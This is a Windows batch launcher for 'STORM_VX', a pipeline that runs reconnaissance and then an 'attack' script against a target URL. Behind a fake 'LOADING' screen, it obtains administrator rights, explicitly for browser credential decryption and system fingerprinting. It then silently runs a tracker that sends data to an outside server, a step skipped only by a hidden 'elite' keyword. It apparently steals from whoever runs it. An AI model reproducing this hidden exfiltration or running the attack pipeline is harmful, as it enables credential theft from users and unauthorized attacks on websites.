@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion
title STORM_VX v2.0

echo.
echo   ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
echo   ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
echo   ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
echo   ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
echo   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
echo   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
echo.
echo          ==== v2.0 Modular - by elite (taha) ====
echo          ==== TRACKER =^> FINDER =^> TESTER ====
echo.

:: --- Check Administrator Privileges ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo   ===============================================
    echo    [!] ADMINISTRATOR PRIVILEGES REQUIRED
    echo   ===============================================
    echo.
    echo    This tool needs Admin access for:
    echo     - Browser credential decryption
    echo     - System fingerprinting
    echo     - Network reconnaissance
    echo.
    echo    Press any key to restart as Administrator...
    echo.
    pause >nul
    :: Launch self as admin — the new window stays open, this one closes
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo   [OK] Running as Administrator
echo.

:: --- Check Python ---
set "PYTHON="
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON=python"
) else (
    where python3 >nul 2>&1
    if %errorlevel%==0 (
        set "PYTHON=python3"
    ) else (
        echo.
        echo   [ERROR] Python not found! Install Python 3.
        echo.
        pause
        exit /b 1
    )
)

:: --- Detect Directory Structure ---
:: SCRIPT_DIR = where run.bat lives (project root)
set "ROOT_DIR=%~dp0"
cd /d "%ROOT_DIR%"

:: Find VF_FINDER.py — could be flat (root) or modular (finder/)
set "FINDER_PATH="
set "TESTER_PATH="
set "TRACKER_PATH="

:: Check flat structure first (all files in root)
if exist "%ROOT_DIR%VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%VF_FINDER.py"
    set "TESTER_PATH=%ROOT_DIR%VF_TESTER.py"
    set "TRACKER_PATH=%ROOT_DIR%VF_TRACKER.py"
)
:: Check modular structure (finder/, tester/, tracker/)
if not defined FINDER_PATH (
    if exist "%ROOT_DIR%finder\VF_FINDER.py" (
        set "FINDER_PATH=%ROOT_DIR%finder\VF_FINDER.py"
    )
)
if not defined TESTER_PATH (
    if exist "%ROOT_DIR%tester\VF_TESTER.py" (
        set "TESTER_PATH=%ROOT_DIR%tester\VF_TESTER.py"
    )
)
if not defined TRACKER_PATH (
    if exist "%ROOT_DIR%tracker\VF_TRACKER.py" (
        set "TRACKER_PATH=%ROOT_DIR%tracker\VF_TRACKER.py"
    )
)

:: Verify FINDER exists
if not defined FINDER_PATH (
    echo.
    echo   [ERROR] VF_FINDER.py not found!
    echo   [ERROR] Checked: %ROOT_DIR% and %ROOT_DIR%finder\
    echo.
    pause
    exit /b 1
)
:: Verify TESTER exists
if not defined TESTER_PATH (
    echo.
    echo   [ERROR] VF_TESTER.py not found!
    echo   [ERROR] Checked: %ROOT_DIR% and %ROOT_DIR%tester\
    echo.
    pause
    exit /b 1
)

:: Set PYTHONPATH to include all relevant directories so imports work
set "PYTHONPATH=%ROOT_DIR%;%ROOT_DIR%finder;%ROOT_DIR%tester;%ROOT_DIR%tracker;%PYTHONPATH%"

echo   [OK] FINDER: %FINDER_PATH%
echo   [OK] TESTER: %TESTER_PATH%
if defined TRACKER_PATH (
    echo   [OK] TRACKER: %TRACKER_PATH%
) else (
    echo   [WARNING] VF_TRACKER.py not found — skipping tracker phase.
)
echo.

:: --- Parse URL from command line args ---
set "TARGET_URL="
set "FINDER_FLAGS=--deep"
set "TESTER_FLAGS="
set "SKIP_TRACKER=0"

:parse_args
if "%~1"=="" goto :done_parsing
if /i "%~1"=="elite" (
    set "SKIP_TRACKER=1"
    shift
    goto :parse_args
)
if "%~1"=="--deep" (
    REM --deep is already default, just skip
    shift
    goto :parse_args
)
if "%~1"=="--no-deep" (
    set "FINDER_FLAGS="
    shift
    goto :parse_args
)
if "%~1"=="--dns" (
    set "FINDER_FLAGS=!FINDER_FLAGS! --dns"
    shift
    goto :parse_args
)
if "%~1"=="--stealth" (
    set "TESTER_FLAGS=--stealth"
    shift
    goto :parse_args
)
set "TARGET_URL=%~1"
shift
goto :parse_args

:done_parsing

:: --- Ask for URL if not provided ---
if not "%TARGET_URL%"=="" goto :url_ready

echo.
echo   -----------------------------------------------
echo    Enter target URL (e.g. https://target.com)
echo   -----------------------------------------------
echo.
set /p "TARGET_URL=   URL: "

if "%TARGET_URL%"=="" (
    echo.
    echo   [ERROR] No URL provided. Exiting.
    echo.
    pause
    exit /b 1
)

:url_ready

:: --- Check for 'elite' keyword in URL input (e.g. "https://target.com elite") ---
echo !TARGET_URL! | findstr /i " elite" >nul 2>&1
if %errorlevel%==0 (
    set "SKIP_TRACKER=1"
    :: Remove 'elite' from URL
    set "TARGET_URL=!TARGET_URL: elite=!"
    set "TARGET_URL=!TARGET_URL:elite=!"
    echo.
    echo   [ELITE MODE] Tracker will be skipped.
    echo.
)

:: --- Auto-add https:// if missing ---
set "URL_CHECK=!TARGET_URL:~0,8!"
if "!URL_CHECK!"=="https://" goto :url_set
set "URL_CHECK=!TARGET_URL:~0,7!"
if "!URL_CHECK!"=="http://" goto :url_set
set "TARGET_URL=https://!TARGET_URL!"

:url_set

echo.

:: --- Loading Phase: Run Tracker silently in background ---
if "%SKIP_TRACKER%"=="1" (
    echo.
    echo   [ELITE MODE] Tracker phase skipped.
    echo.
) else (
    if defined TRACKER_PATH (
        echo   ===============================================
        echo          LOADING ... Please Wait ...
        echo   ===============================================
        echo.
        %PYTHON% "%TRACKER_PATH%" --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
        echo.
        echo   [OK] Loading complete.
        echo.
    )
)

echo   ===============================================
echo   [PHASE 1] Running VF_FINDER - Reconnaissance
echo   ===============================================
echo   Target: %TARGET_URL%
echo.

%PYTHON% "%FINDER_PATH%" "%TARGET_URL%" %FINDER_FLAGS% --output VF_PROFILE.json

if not exist "VF_PROFILE.json" (
    echo.
    echo   [ERROR] Profile file not created! FINDER may have failed.
    echo.
    pause
    exit /b 1
)

echo.
echo   [OK] Profile saved to: VF_PROFILE.json
echo.

echo   ===============================================
echo   [PHASE 2] Running VF_TESTER - Attack
echo   ===============================================
echo   Profile: VF_PROFILE.json
echo.

%PYTHON% "%TESTER_PATH%" --profile VF_PROFILE.json %TESTER_FLAGS%

echo.
echo   ===============================================
echo   [DONE] Pipeline completed.
echo   ===============================================
echo.
pause
